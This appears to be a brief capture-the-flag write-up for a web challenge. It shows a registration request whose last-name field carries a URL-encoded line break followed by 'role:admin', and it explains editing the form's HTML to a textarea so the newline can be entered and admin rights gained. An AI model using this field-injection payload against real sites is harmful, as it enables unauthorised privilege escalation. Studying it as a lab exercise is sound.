Form has a similar request body

> user=usernn&password=qwerty&lname=lname%0D%0Arole%3Aadmin&email=aaa%40mail.com&register=Register

for this need to change html-code

`<textarea type="text" id="lname" value="" class="form-control" name="lname" required="">`

and fill last name field like this

>lname
>role:admin

then just log in and challenge complite